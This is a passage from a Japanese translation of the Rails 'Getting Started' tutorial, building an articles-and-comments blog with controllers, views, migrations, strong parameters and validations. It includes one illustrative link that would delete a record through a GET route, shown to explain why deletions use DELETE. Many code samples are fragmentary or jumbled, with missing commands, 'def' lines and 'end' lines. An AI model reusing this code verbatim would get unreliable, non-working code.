以下の出力のprefix列や他の列については後ほど解説しますが、ここでご注目いただきたいのは、Railsは「articles」というリソース名から単数形の「article」を推測し、両者をその意味にそって使い分けているという点です。prefix列で単一の項目には単数形のarticle、複数項目を扱う場合には複数形のarticlesが使われているという具合です。
      Prefix Verb   URI Pattern                  Controller#Action
    articles GET    /articles(.:format)          articles#index
             POST   /articles(.:format)          articles#create
edit_article GET    /articles/:id/edit(.:format) articles#edit
     article GET    /articles/:id(.:format)      articles#show
             PATCH  /articles/:id(.:format)      articles#update
             PUT    /articles/:id(.:format)      articles#update
             DELETE /articles/:id(.:format)      articles#destroy
        root GET    /                            welcome#index
次の節では、アプリケーションで新しい記事を作成してそれを表示する機能を追加しましょう。
これはCRUDでいう"C" (作成) と"R" (読み出し) の操作に相当します。
作成するフォームは以下のような感じになります。
新規記事投稿フォーム](images/getting_started/new_article.png)
これだけでは飾り気がなさすぎる感じもしますが、今はこれでよしとします。
スタイルの追加はその後に行います。
### 土台を設置する
最初に、新規記事を作成するための場所がアプリケーション内に必要です。
置き場所はやはり`/articles/new`でしょう。
ルーティングは既に定義されているので、リクエストはアプリケーションの`/articles/new`に送られます。
ブラウザで<http://localhost:3000/articles/new>を開くと、今はルーティングエラーが表示されます。
Another routing error, uninitialized constant ArticlesController](images/getting_started/routing_error_no_controller.png)
このエラーが発生したのは、ルーティングで指定された先に、リクエストを処理するように定義されたコントローラが見つからないためです。
この問題を解決するには、それに対応する`ArticlesController`を作成すればよいのです。
以下のコマンドを実行して解決します。
今作成された`app/controllers/articles_controller.rb`をエディタで開くと、以下のような空のコントローラが作成されています。
class ArticlesController < ApplicationController
コントローラは、`ApplicationController`を継承する形で定義されるシンプルなクラスです。
コントローラの内側で定義されたメソッドは、コントローラのアクションになります。
制作中のブログアプリケーションでは、これらのアクションがarticleに対するCRUD操作を担当します。
NOTE: Rubyのメソッドは`public`、`private`、`protected`に分けられますが、コントローラのアクションになれるのは`public`メソッドだけです。
詳細については[Programming Ruby](http://www.ruby-doc.org/docs/ProgrammingRuby/)を参照してください。
ブラウザの<http://localhost:3000/articles/new>を再表示すると、今度は別のエラーが表示されます。
Unknown action new for ArticlesController!](
生成した`ArticlesController`コントローラに`new`アクションが見つからないというエラーです。
これは、Railsでアクションを指定せずに生成したコントローラは中身が空のままになるためです。
コントローラ内にアクションを手作りするには、単にコントローラ内でメソッドを定義すればよいのです。
  def new
`ArticlesController`コントローラに`new`メソッドを作成してからブラウザで<http://localhost:3000/articles/new>を再表示すると、今度はまた違うエラーが表示されます。
Railsでは、このシンプルなアクションに関連付けられたビューがあり、そこで情報を表示できることを期待しています。
アクションは定義されましたが、これに関連付けられたビューがないのでエラーが表示されます。
なお、上の画像ではエラーメッセージの下の部分は切り捨ててあります。
完全なメッセージは以下のような感じになります。
Missing template articles/new, application/new with {locale:[:en], formats:[:html], handlers:[:erb, :builder, :coffee]}. 
Searched in: * "/path/to/blog/app/views"
何だかたくさんのテキストが表示されました。
それぞれの部分がどういう意味なのかを見てみましょう。
最初の部分では、どのテンプレートが見当たらないかが示されています。
ここでは`articles/new`というテンプレートがあるはずだと言っています。
Railsは最初にこのテンプレートを探します。
見つからない場合は次に`application/new`というテンプレートがあるかどうかを探します。
`application/new`にテンプレートがあるかどうかを探しているのは、`ArticlesController`コントローラは`ApplicationController`コントローラを継承しているからです。
次の部分にはハッシュがあります。
ハッシュの`:locale`キーは、単にそのテンプレートが何語向けなのかを示しています。
デフォルトでは英語 ("en") テンプレートが使用されます。
次の`:formats`キーは、応答時に返されるテンプレートのフォーマットを示します。
デフォルトのフォーマットは`:html`なので、RailsはHTMLテンプレートを探します。
最後の`:handlers`キーは、テンプレートを描画するときに使用される _テンプレートハンドラ_ を示します。HTMLテンプレートで最もよく使用されるのは`:erb`です。同様に、XMLテンプレートには`:builder`が指定が、CoffeeScriptには`:coffee`が最もよく使用されます。
最後の部分では、Railsがテンプレートを探した場所が示されています。
このブログアプリケーションのようなシンプルなRailsアプリケーションでは、テンプレートの置き場所は1箇所ですが、複雑なアプリケーションではさまざまな場所にテンプレートが置かれることもあります。
この場合、テンプレートを`app/views/articles/new.html.erb`に置くのが最もシンプルです。
テンプレートのファイル名に付いている拡張子に気を付けてください。1つ目の拡張子はテンプレートの _フォーマット_ を表し、2つ目の拡張子は使用される _ハンドラー_ を示します。
Railsは、`articles/new`というテンプレートをアプリケーションの`app/views`で探そうとします。
ここではテンプレートのフォーマットはHTMLでなければならず、ハンドラーは`erb`、`builder`、`coffee`のいずれかでないといけないということになります。
ここで作成しようとしているのは新しいHTMLフォームなので、`ERB`言語が使用されます。
従って、テンプレートのファイル名は`articles/new.html.erb`でなければならず、アプリケーションの`app/views`ディレクトリの下になければならないことになります。
それでは`app/views/articles/new.html.erb`を作成し、その中に以下のように記入しましょう。
<h1>New Article</h1>
<http://localhost:3000/articles/new>をブラウザで再表示すると、ページにタイトルが表示されるようになりました。
ついに、ルーティングとコントローラとアクションとビューが協調して動作するようになりました。
いよいよ新規記事を投稿するフォームを作成することにしましょう。
### 最初のフォーム
Railsには`form_for`というヘルパーメソッドがあり、主にこれを使用してフォームを作成します。
以下のコードを`app/views/articles/new.html.erb`に追加して、`form_for`メソッドを使用できるようにしましょう。
<%= form_for :article do |f| %>
    <%= f.label :title %><br>
    <%= f.text_field :title %>
    <%= f.submit %>
ページをブラウザで再表示すると、先に図に示したフォームの例のとおりにフォームが表示されます。
Railsのフォーム作成は非常に簡単です。
`form_for`メソッドを呼び出すときには、このフォームを識別するためのオブジェクトを渡してください。
ここでは`:article`というシンボルを渡します。
`form_for`ヘルパーは、これを見て何のフォームであるかを知ることができます。
このメソッドのブロックの内側は`FormBuilder`オブジェクトを置きます(`f`で表すのが通例です)。ここでは2つのラベルと2つのテキストフィールドが置かれ、それぞれタイトルと記事本文になります。
最後に、`f`オブジェクトに対して`submit`を実行すると、フォームの送信ボタンが作成されます。
しかし、このフォームには1つ問題があります。
このフォームページのソースを表示して、生成されたHTMLをよく調べてみると、フォームの`action`属性の送信先が`/articles/new`になってしまっています。
`/articles/new`というルーティングは、このフォームを最初に表示するときに使用されるものなので、記入されたフォームの送信先まで同じルーティングにしてしまうのは変です。`/articles/new`はフォームの表示専用にすべきです。
どうやらフォームの送信先は別のURLにしなければならないようです。
送信先の指定は`form_for`の`:url`オプションで簡単に指定できます。
Railsでは、新しいフォームの送信先となるアクションは"create"にするのが普通ですので、それに従って送信先を変更しましょう。
`app/views/articles/new.html.erb`をエディタで開き、`form_for`の行を以下のように変更します。
<%= form_for :article, url: articles_path do |f| %>
この例では、`:url`オプションに`articles_path`ヘルパーが渡されています。
このフォームと、それに関連付けられたルーティングが定義されることで、フォームに記入して送信ボタンをクリックすると新しい記事作成プロセスが開始されるようになります。
この状態でフォームを送信すると、既にお馴染みの以下のエラーが表示されます。
そこで今度は`ArticlesController`コントローラ内に`create`アクションを作成し、フォームが動作するようにしましょう。
### 記事を作成する
修正後フォームを再送信すると、今度はまたしても「a template is missing」エラーが表示されます。
ひとまずこのエラーは無視しましょう。
`create`アクションの役割は、記事をデータベースに保存することです。
フォームを送信すると、フォームに含まれるフィールドは _パラメータ_ としてRailsに送信されます。
これらのパラメータは、受け取ったコントローラ内のアクションで参照可能になっており、これを使用して特定のタスクを実行します。
実際のパラメータがどのようになっているかを確認するために、`create`アクションに以下の変更を加えてみましょう。
  render plain: params[:article].inspect
ここで`render`メソッドは非常に単純なハッシュを引数に取ります。ハッシュのキーは`plain`、ハッシュの値は`params[:article].inspect`です。
`params`メソッドは、フォームから送信されてきたパラメータ (つまりフォームのフィールド) を表すオブジェクトです。
`params`メソッドは`ActiveSupport::HashWithIndifferentAccess`オブジェクトを返します。文字列またはシンボルを使用して、このオブジェクトのハッシュのキーを指定できます。
今回の場合、必要なのはフォームの値のうちの1つだけです。
フォームを再送信してみると、今度はmissing templateエラーが表示されなくなりました。
今度は以下が表示されました。
{"title"=>"First article!", "text"=>"This is my first article."}
このアクションは、フォームから送信されたパラメータをそのまま表示するようになりました。
しかしこのままでは役に立ちそうにありません。
確かにパラメータは表示されるようになりましたが、何の加工もされていません。
### Articleモデルを作成する
Railsのモデルは、単数形の名前を持ち、対応するデータベーステーブル名は複数形で表されるというルールがあります。
Railsにはモデル作成用のジェネレータもあり、多くのRails開発者がモデル作成の際に使用しています。
モデルを作成するにはターミナルで以下のコマンドを実行します。
このコマンドを実行すると、`Article`モデルが作成されます。その中にはstring型の _title_ 属性とtext型の _text_ 属性が作成されています。
これらの属性は、データベースの`articles`テーブルに自動的に追加され、`Article`モデルと対応付けられます (訳注: 実際には後述するマイグレーションを行わないとデータベースとの対応付けは完了しません)。
Railsによって多数のファイルが作成されました。
ここで必要なのは、`app/models/article.rb`と`db/migrate/20140120191729_create_articles.rb`の2つだけです (後者のファイル名には日付が含まれているのでこれと同じにはなりません)。
後者のマイグレーションファイルは、データベース構造を作成するためのものであり、この次に説明します。
TIP: Active Recordは、データベースのカラム名とモデルの属性を自動的に対応付けるインテリジェントな機能を有しています。このおかげで、Railsのモデルでは属性をいちいち宣言する必要がありません。そうした作業はActive Recordが自動的にやってくれます。
### マイグレーションを実行する
マイグレーションはRubyのクラスであり、データベーステーブルの作成や変更を簡単に行うためのしくみです。
マイグレーションを実行するにはrakeコマンドを実行します。マイグレーションを使用して行ったデータベース構成の変更は、後から取り消すことができます。
マイグレーションファイルの名前にはタイムスタンプが含まれており、これに基いて、マイグレーションは作成された順に実行されます。
ここで`db/migrate/20140120191729_create_articles.rb` ファイルをエディタで開いてみると (タイムスタンプは各自異なることにご注意ください)、以下のようになっています。
class CreateArticles < ActiveRecord::Migration
    create_table :articles do |t|
      t.text :text
上のマイグレーションファイルには`change`という名前のメソッドが作成されており、マイグレーションの実行時に呼び出されます。
このメソッドで定義されてる操作は取り消しが可能です。つまり、Railsはchangeメソッドで行われたマイグレーションを必要に応じて元に戻すことができます。
このマイグレーションを実行すると、`articles`というテーブルが作成され、文字列カラムとテキストカラムが1つずつ作成されます。
Railsは、マイグレーション時に作成日と更新日を追跡するためのタイムスタンプフィールドを2つ作成します。これは指定がなくても自動的に行われます。
ここでは、以下のようにrakeコマンドでマイグレーションを実行します。
マイグレーションコマンドによってArticlesテーブルがデータベース上に作成されます。
==  CreateArticles: migrating ==================================================
-- create_table(:articles)
   -> 0.0019s
==  CreateArticles: migrated (0.0020s) =========================================
NOTE: マイグレーションはデフォルトではdevelopment (開発) 環境で実行されます。そのため、`config/database.yml`ファイルの`development`セクションで定義されている開発用データベースに対して実行される点にご注意ください。
### コントローラでデータを保存する
ふたたび`ArticlesController`に戻りましょう。先ほど作成した`Article`モデルを使用して、`create`アクションを変更しなければなりません。
`app/controllers/articles_controller.rb`をエディタで開き、`create`アクションを次のように変更します。
  @article = Article.new(params[:article])
  @article.save
  redirect_to @article
変更内容を説明します。Railsのすべてのモデルは初期化時に属性(フィールド)を与えられ、それらはデータベースカラムに自動的に対応付けられます。
メソッドの1行目ではまさにそれが行われています (取り出したい属性は`params[:article]`の中にあります)。
次の`@article.save`で、このモデルをデータベースに保存します。
最後に、ユーザーを`show`アクションにリダイレクトします (`show`アクションはこの後定義します)。訳注: モデルを保持している@articleを指定するだけで、そのモデルを表示するための`show`アクションにリダイレクトされる点にご注目ください。
TIP: 後に解説しますが、`@article.save`は保存に成功したかどうかを真偽値 (trueまたはfalse) で返します。
この時点でブラウザで<http://localhost:3000/articles/new>を表示すると、記事の作成が *ほぼ* 可能な状態になっています。
実際にやってみましょう。
すると、以下のようなエラーが表示されます。
Railsにはセキュリティの高いアプリケーションを開発するのに便利な機能が多数あり、ここではその機能に引っかかったのです。
なぜそんな面倒なことをしないといけないのでしょうか。
コントローラが受け取ったパラメータをノーチェックでまるごと自動的にモデルに渡せるようにする方が確かに開発は楽なのですが、パラメータの渡し方をこのように便利にしてしまうと、パラメータがチェックされていない点を攻撃者に悪用される可能性があります。
たとえば、サーバーへのリクエストに含まれる新規投稿送信フォームに、もともとフォームになかったフィールドが攻撃者によって密かに追加され、それがアプリケーションの整合性を脅かす可能性が考えられます。
チェックされていないパラメータをまるごとモデルに保存する行為は、モデルに対する「マスアサインメント」と呼ばれています。これが発生すると、正常なデータの中に悪意のあるデータが含まれてしまう可能性があります。
そこで、コントローラで渡されるパラメータはホワイトリストでチェックし、不正なマスアサインメントを防止する必要があるのです。
この場合、`create`でパラメータを安全に使用するために、`title`と`text`パラメータの利用を「許可」し、かつ「必須」であることを指定したいのです。
この指定を文法化するために、`require`メソッドと`permit`メソッドが導入されました。
  @article = Article.new(params.require(:article).permit(:title, :text))
この記法を毎回繰り返すのは煩雑なので、たとえば`create`アクションと`update`アクションで共用できるようにこのメソッドをくくりだしておくのが普通です。
くくりだしたメソッドは、マスアサインメントを避けるだけでなく、外部から不正に呼び出されることのないように`private`宣言の後に置いてください。
修正結果は以下のようになります。
  @article = Article.new(article_params)
  def article_params
    params.require(:article).permit(:title, :text)
### 記事を表示する
現時点の状態でフォームを再度送信すると、`show`アクションがないというメッセージがRailsから返されます。
このままでは実用に耐えないので、`show`アクションを追加して先に進むことにしましょう。
article GET    /articles/:id(.:format)      articles#show
`:id`は、ここに`:id`パラメータが置かれることを指定するための特殊な文法です。この場合は記事のidを表します。
newで既に行ったのと同じ要領で、`app/controllers/articles_controller.rb`に`show`アクションを追加し、対応するビューも追加する必要があります。
以下の例では
def show
  @article = Article.find(params[:id])
ここでいくつか注意すべき点があります。
これは、Railsではコントローラのインスタンス変数はすべてビューに渡されるようになっているからです (訳注: Railsはそのために背後でインスタンス変数をコントローラからビューに絶え間なくコピーし続けています)。
それでは、`app/views/articles/show.html.erb`ファイルを作成し、以下のように記入しましょう。
  <strong>Title:</strong>
  <%= @article.title %>
  <strong>Text:</strong>
  <%= @article.text %>
上のように変更したことで、新しい記事の作成がようやくできるようになりました。
<http://localhost:3000/articles/new>をブラウザで開いて試してみましょう。
Show action for articles](images/getting_started/show_action_for_articles.png)
### すべての記事を一覧表示する
単独の記事は表示できるようになりましたが、今度は記事の一覧も表示できるようにしてみましょう。
articles GET    /articles(.:format)          articles#index
    @articles = Article.all
<h1>Listing articles</h1>
<table>
  <tr>
    <th>Title</th>
    <th>Text</th>
  </tr>
  <% @articles.each do |article| %>
    <tr>
      <td><%= article.title %></td>
      <td><%= article.text %></td>
    </tr>
</table>
### リンクの追加
ここまでで、記事の作成、表示、一覧表示ができるようになりました。
今度は、ページ間を移動するためのリンクを追加してみましょう。
`app/views/welcome/index.html.erb`を開いて以下のように変更してください。
<%= link_to 'My Blog', controller: 'articles' %>
`link_to`メソッドは、Railsのビルトインヘルパーの1つです。
このメソッドは、指定されたテキストに基いたリンクを作成し、ジャンプ先を表示します。ここでは各記事へのパスを指定します。
他のビューへのリンクも作成してみましょう。"New Article"リンクを`app/views/articles/index.html.erb`に追加し、`<table>`タグの上に置きます。
<%= link_to 'New article', new_article_path %>
このリンクをクリックするとフォームが表示され、そこで新しい記事を作成することができるようになります。
<%= link_to 'Back', articles_path %>
TIP: 現在と同じコントローラのアクションにリンクする場合は、`controller`の指定は不要です。デフォルトでは現在のコントローラが使用されるからです。
TIP: developmentモード (これはRailsのデフォルトのモードです) では、Railsはリクエストのたびにアプリケーションを再読み込みします。これは開発をやりやすくするためであり、変更を行なうたびにRailsのWebサーバーを再起動する必要はありません。
### 検証 (バリデーション) の追加
モデルファイル`app/models/article.rb`の中身は、以下のように驚くほどシンプルです。
ファイルにはこれしか書かれていませんが、この`Article`クラスが`ActiveRecord::Base`クラスを継承していることにご注目ください。
Active Recordは、基本的なデータベースCRUD (Create、Read、Update、Destroy) 操作、データの検証 (バリデーション)、洗練された検索機能、複数のモデルを関連付ける(リレーションシップ) など、きわめて多くの機能をRailsモデルに無償で提供しています。
Railsには、モデルに渡したデータを検証する機能もあります。
`app/models/article.rb`ファイルをエディタで開き、以下のように変更します。
  validates :title, presence: true,
                    length: { minimum: 5 }
このように変更されると、すべての記事にタイトルが存在し、その長さが5文字以上であることが保証されます。そうでない場合には記事はデータベースに保存されません。
Railsには豊富な検証機能があり、存在確認、カラムでの重複確認、フォーマット確認、関連付けられたオブジェクトがあるかどうかの確認などが行えます。
検証の詳細については[Active Record バリデーション](active_record_validations.html)を参照してください。
検証機能が追加されたので、検証が通らない内容を持つ@articleに対して`@article.save`を実行すると`false`が返されるようになりました。
さて、`app/controllers/articles_controller.rb`を再度開いてみると、残念なことにまだ`create`アクションで`@article.save`の結果を利用するようになっていません。
`@article.save`が失敗したらそのことをユーザーに表示してあげないと不親切です。
そのためには、`app/controllers/articles_controller.rb`の`new`アクション`と`create`アクションを以下のように変更してください。
def new
  @article = Article.new
  if @article.save
    redirect_to @article
  else
    render 'new'
`new`で`@article`というインスタンス変数が新たに作成されるようになりました。これを何に使うのかはすぐにわかります。
`create`アクションも、`save`の結果が`false`の場合には、`redirect_to`ではなく、`new`テンプレートに対する`render`を実行するように変更されました。
ここで`render`メソッドを使用する理由は、ビューの`new`テンプレートが描画されたときに、`@article`オブジェクトがビューの`new`テンプレートに返されるようにするためです。
`render`による描画は、フォームの送信時と同じリクエスト内で行われます。対照的に、`redirect_to`はサーバーに別途リクエストを発行するようブラウザに対して指示するので、やりとりが1往復増えます。
<http://localhost:3000/articles/new>をブラウザで再表示し、わざと記事のタイトルを空にして保存してみましょう。Railsは記事入力フォームを再表示するはずです。しかしこれだけではまだ不親切です。
入力のどこに問題があったのかをユーザーに通知する必要があります。
そこで、`app/views/articles/new.html.erb`を変更して、エラーメッセージがある場合に表示するようにしてみましょう。
  <% if @article.errors.any? 
  <div id="error_explanation">
    <ul>
    <% @article.errors.full_messages.each do |msg| %>
      <li><%= msg %></li>
    <% end %>
    </ul>
  </div>
何やら目新しいコードが追加されています。
ここでは、`@article.errors.any?`でエラーが発生しているかどうかをチェックしています。そしてエラーの場合は`@article.errors.full_messages`でエラーメッセージを全文表示します。
`pluralize`は、数値を受け取ってそれに応じて英語の「単数形/複数形」活用を行ってくれるRailsのヘルパーメソッドです。
`ArticlesController`に`@article = Article.new`を追加した理由は、そうしないとビューで受け取る`@article`が`nil`になってしまい、`@article.errors.any?`を呼び出すところでエラーになってしまうためです。Articleのインスタンス作成に成功したときは@articleが`nil`にならないようにしておきたいわけです。
TIP: Railsでは、エラーメッセージを含むフィールドは自動的に`field_with_errors`クラスを持つdivタグで囲まれます。
これを利用して、エラーメッセージをもっと目立たせるようにcssルールを定義しても構いません。
エラーが表示されているフォーム](images/getting_started/form_with_errors.png)
### 記事を更新する
ここまでで、CRUDのうちCとRを実現しました。
今度はUの部分、つまり記事の更新を実装してみましょう。
def edit
  @article = Article.find(params[:id])
編集用のビューに含まれるフォームは、記事を作成するときのビューに含まれるフォームと基本的にほとんど同じです。
`app/views/articles/edit.html.erb`というファイルを作成し、以下のコードを入力してください。
<h1>Editing article</h1>
<%= form_for :article, url: article_path(@article), method: :patch do |f| %>
このフォームの送信先は`update`アクションになります。今の時点では未定義ですが、この後すぐ定義します。
ここで`method: :patch`というオプションが指定されていますので、`PATCH`というHTTPメソッドを使用してこのフォームを送信しようとしていることがRailsに伝わります。PATCHメソッドは、RESTプロトコルに基いてリソースを **更新** するために使用されます。
`form_for`ヘルパーメソッドの最初のパラメータには`@article`のようなオブジェクトを使用できます。`@article`のようなオブジェクトが最初のパラメータとして渡されると、ヘルパーはそのパラメータに含まれているフィールドを使用してフォームの項目を埋めます。
ここで面白いのは、`@article`のようなインスタンス変数の代わりに同じ名前のシンボル (`:article`など) を渡した場合にも動作はまったく同じであることです。
以上がこのコードで行われていることです。
def update
  if @article.update(article_params)
    render 'edit'
既存のレコードを更新したいときには新たに`update`アクションを使用します。このアクションには、更新後の属性を含むハッシュを渡すことができます。
createのときに既に行ったように、記事の更新に失敗してエラーが発生した場合、そのことをユーザーに伝えるようにしましょう。
createアクションで使用した`article_params`メソッドをここでも使うことにします。
TIP: `update`に属性をすべて渡す必要はありません。
たとえば、`@article.update(title: 'A new title')`を実行した場合、Railsは`title`属性のみを更新し、それ以外の属性は変更しません。
最後に、`edit`アクションへのリンクを全記事の一覧に追加しましょう。`app/views/articles/index.html.erb`に以下のように手を加えて"Show"リンクの隣にEditリンクを追加します。
    <th colspan="2"></th>
    <td><%= link_to 'Show', article_path(article) %></td>
    <td><%= link_to 'Edit', edit_article_path(article) %></td>
  </tr>
同様に、`app/views/articles/show.html.erb`テンプレートにもEditリンクを追加しましょう。こうしておけば各記事のページから編集を行えるようになります。
テンプレートの最下部に以下を追加します。
ここまでの変更で、アプリケーションの外観は以下のような感じになっているはずです。
Editリンクが追加されたindexアクション](images/getting_started/index_action_with_edit_link.png)
### 部分テンプレート(パーシャル)を使用してビューの重複コードをきれいにする
TIP: パーシャルについての詳細は本ガイドの[レイアウトとレンダリング](layouts_and_rendering.html)を参照してください。
`app/views/articles/_form.html.erb`という名前のパーシャルファイルを作成し、以下の内容を入力してください。
<%= form_for @article do |f| %>
このコードをよく観察してみると、`form_for`の宣言部分以外には元のコードとの違いがないことがわかります。
他のフォーム内のコードを置き換えるパーシャル内での`form_for`宣言がこのように短くて簡潔で済むのは、`@article`がRESTfulルーティングの完全なセットに対応する **リソース** であり、必要なURIとメソッドをRailsがそれに基いて推測できるからです。
今度は`app/views/articles/new.html.erb`ビューを完全に書き直して、今作成したパーシャルをここで使ってみましょう。
<h1>New article</h1>
<%= render 'form' %>
続いて、`app/views/articles/edit.html.erb`ビューでも同じ作業を行います。
<h1>Edit article</h1>
### 記事を削除する
いよいよCRUDのDまで到達しました。ここでは記事をデータベースから削除します。
DELETE /articles/:id(.:format)      articles#destroy
ルーティングメソッドである`delete`は、リソースを削除するときに使用する必要があります。
なお、この削除用ルーティングに通常の`get`ルーティングが使用されていると、以下のような危険なURLを送信できてしまいます。
<a href='http://example.com/articles/1/destroy'>look at this cat!
def destroy
  @article.destroy
  @article = Article.new
  @article = Article.new(article_params)
  if @article.save
    redirect_to @article
  else
    render 'new'
  if @article.update(article_params)
    render 'edit'
  def destroy
  @article.destroy
  redirect_to articles_path
  def article_params
    params.require(:article).permit(:title, :text)
データベースのレコードを削除したい場合には、Active Recordの`destroy`メソッドを呼びます。
なお、レコードの削除の場合、それ専用のビューテンプレートは不要です。その代わりに削除後に`index`アクションにリダイレクトします。
最後に、 `index`アクションのテンプレート(`app/views/articles/index.html.erb`)に'Destroy'リンクを追加し、機能を完成させましょう。
<h1>Listing Articles</h1>
    <th colspan="3"></th>
    <td><%= link_to 'Destroy', article_path(article),
      method
} %></td>
上で追加したコードでは、`link_to`メソッドの使い方がこれまでと違っていることにご注目ください。
2番目の引数で名前付きルートを渡している点はこれまでと同じですが、その後に別の引数があります。
この`:method`オプションと`:'data-confirm'`オプションはHTML5の属性です。このリンクをクリックすると、本当に削除してよいかどうかを確認するメッセージを表示し、その後`delete`メソッドとリンクを送信します。
このダイアログボックスの表示は`jquery_ujs`というJavaScriptファイルによって自動的に行われます。このファイルはアプリケーションの生成時に自動的にアプリケーションレイアウト (`app/views/layouts/application.html.erb`) に含まれます。
このJavaScriptファイルがないと、ダイアログボックスは表示されなくなります。
Confirm Dialog](images/getting_started/confirm_dialog.png)
以上で記事の作成、表示、一覧表示、更新、削除をひととおり実装できました。お疲れさまでした!
ルーティングの詳細については、本ガイドの[Railsのルーティング](routing.html)を参照してください。
2番目のモデルを追加する
今度はアプリケーションに第2のモデルを追加しましょう。
この第2のモデルでは、記事へのコメントを扱います。
### モデルを生成する
今回のモデルの生成には、`Article`モデルを生成したときと同じジェネレータを使用します。
作成する`Comment`モデルは、記事への参照を保持します。
以下のコマンドをターミナルで実行してください。
このコマンドを実行すると、4つのファイルが生成されます。
| ファイル                                         | 目的                                                                                                |
| db/migrate/20140120201010_create_comments.rb | データベースにコメント用のテーブルを作成するためのマイグレーションファイル (ファイル名のタイムスタンプはこれとは異なります) |
| app/models/comment.rb                        | Commentモデル                                                                                      |
| test/models/comment_test.rb                  | Commentモデルをテストするためのハーネス                                                                 |
| test/fixtures/comments.yml                   | テストで使用するサンプルコメント                                                                     |
最初に`app/models/comment.rb`を見てみましょう。
Commentモデルの内容は、これまでに見た`Article`モデルと非常によく似ています。
違いといえば、Active Recordの _関連付け (アソシエーション)_ を設定するための`belongs_to :article`という行がある点です。
関連付けの詳細については、本ガイドの次の節で説明します。
モデルのファイルの他にマイグレーションファイルも生成されています。マイグレーションファイルは、モデルに対応するデータベーステーブルを生成するために使用されます。
class CreateComments < ActiveRecord::Migration
    create_table :comments do |t|
      t.string :commenter
      t.text :body
      # 以下の行によって`article_id`という整数カラムが追加される
      t.references :article, index: true
`t.references`という行は、2つのモデルの関連付けを指定するための外部キーを設定します。
このとき、関連付け用のインデックスもカラム上に作成されます。
それではマイグレーションを実行しましょう。
Railsは、これまで実行されていないマイグレーションだけを適切に見分けて実行しますので、以下のようなメッセージだけが表示されるはずです。
==  CreateComments: migrating =================================================
-- create_table(:comments)
   -> 0.0115s
==  CreateComments: migrated (0.0119s) ========================================
### モデル同士を関連付ける
Active Recordの関連付け機能により、2つのモデルの間にリレーションシップを簡単に宣言することができます。
今回の記事とコメントというモデルの場合、以下のいずれかの方法で関連付けを設定できます。
* 1つのコメントは1つの記事に属する (Each comment belongs to one article)。
* 1つの記事は複数のコメントを持てる (One article can have many comments)。
そして上の方法(における英語の記述)は、Railsで関連付けを宣言するために使用される文法と非常に似ています。
`Comment` モデル (app/models/comment.rb) 内のコードに既に書かれていたように、1つの記事には1つのコメントが属しています。
そして、Articleモデル`app/models/article.rb`を編集して、他方のモデルを追加する必要があります。
2つのモデルで行われているこれらの宣言によって、さまざまな動作が自動化されています。
たとえば、`@article`というインスタンス変数に記事が1つ含まれているのであれば、`@article.comments`と書くだけでその記事に関連付けられているコメントをすべて取得することができるのです。
TIP: Active Recordの関連付けの詳細については、[Active Recordの関連付け(アソシエーション)](association_basics.html)ガイドを参照してください。
### コメントへのルーティングを追加する
`welcome`コントローラで行ったときと同様、`comments`を参照するためにRailsが知っておくべきルーティングを追加する必要があります。
再び`config/routes.rb`ファイルを開き、以下のように変更してください。
この設定により、`article`の内側に _ネストされたリソース_ として`comments`が作成されます。
これは、モデルの記述とは別の視点から、記事とコメントの間のリレーションシップを階層的に捉えたものであると言えます。
TIP: ルーティングの詳細については[Railsのルーティング](routing.html)を参照してください。
### コントローラを生成する
モデルを手作りしたのですから、それに合ったコントローラも作ってみたくなります。
ということで再びこれまでと同じジェネレータを使用してみましょう。
| ファイル/ディレクトリ                               | 目的                                  |
----------------------------------------
| app/controllers/comments_controller.rb       | コメント用コントローラ                  |
| app/views/comments/                          | コントローラのビューはここにおかれる  |
| test/controllers/comments_controller_test.rb | コントローラのテスト用ファイル              |
| app/helpers/comments_helper.rb               | ビューヘルパー                       |
| app/assets/javascripts/comment.js.coffee     | コントローラ用のCoffeeScript          |
| app/assets/stylesheets/comment.css.scss      | コントローラ用のCSS (カスケーディングスタイルシート) ファイル |
一般的なブログと同様、このブログの記事を読んだ人はそこに直接コメントを追加したくなるでしょう。そしてコメントを追加後に元の記事表示ページに戻り、コメントがそこに反映されていることを確認したいはずです。
そこで、`CommentsController`を使用してコメントを作成したり、スパムコメントが書き込まれたら削除できるようにしたいと思います。
そこで最初に、Articleのshowテンプレート (`app/views/articles/show.html.erb`) を改造して新規コメントを作成できるようにしましょう。
<h2>Add a comment:</h2>
<%= form_for([@article, @article.comments.build]) do |f| %>
    <%= f.label :commenter %><br>
    <%= f.text_field :commenter %>
    <%= f.label :body %><br>
    <%= f.text_area :body %>
上のコードでは、`Article`のshowページにフォームが1つ追加されています。このフォームは`CommentsController`の`create`アクションを呼び出すことでコメントを新規作成します。
`form_for`呼び出しでは配列を1つ渡しています。これは`/articles/1/comments`のような「ネストしたルーティング (nested route)」を生成します。
今度は`app/controllers/comments_controller.rb`の`create`アクションを改造しましょう。
class CommentsController < ApplicationController
    @article = Article.find(params[:article_id])
    @comment = @article.comments.create(comment_params)
    redirect_to article_path(@article)
    def comment_params
      params.require(:comment).permit(:commenter, :body)
上のコードは、Articleコントローラのコードを書いていたときよりも何だか複雑に見えます。
これはネスティングを使用したことによって複雑さが増したのです。
コメント関連のリクエストでは、コメントが追加される先の記事がどれであったかを忘れないようにしておく必要があります。そこで、`Article`モデルの`find`メソッドを最初に呼び出し、リクエストで言及されている記事(のオブジェクト)を取得して@articleに保存しています。
さらにこのコードでは、関連付けによって使用できるようになったメソッドをいくつも利用しています。
`@article.comments`に対して`create`メソッドを実行することで、コメントの作成と保存を同時に行っています(訳注: `build`メソッドにすれば作成のみで保存は行いません)。
この方法でコメントを作成すると、コメントと記事が自動的にリンクされ、指定された記事に対してコメントが従属するようになります。
新しいコメントの作成が完了したら、`article_path(@article)`ヘルパーを使用して元の記事の画面に戻ります。
既に説明したように、このヘルパーを呼び出すと`ArticlesController`の`show`アクションが呼び出され、`show.html.erb`テンプレートが描画されます。
この画面にコメントを表示できるようにしたいので、`app/views/articles/show.html.erb`に以下のコードを追加しましょう。
<h2>Comments</h2>
<% @article.comments.each do |comment| %>
  <strong>Commenter:</strong>
  <%= comment.commenter %>
  <strong>Comment:</strong>
  <%= comment.body %>
以上で、ブログに記事やコメントを自由に追加して、それらを正しい場所に表示できるようになりました。
記事にコメントが追加されたところ](images/getting_started/article_with_comments.png)
リファクタリング
さて、ブログの記事とコメントが動作するようになったので、ここで`app/views/articles/show.html.erb`テンプレートを見てみましょう。
何やらコードがたくさん書かれていて読みにくいように思えます。
ここでもパーシャルを使用してコードをきれいにしましょう。
### パーシャルコレクションを描画する
最初に、特定記事のコメントをすべて表示する部分を切り出してコメントパーシャルを作成しましょう。
  <strong>Commenter:</strong>
  <%= comment.commenter %>
  <strong>Comment:</strong>
  <%= comment.body %>
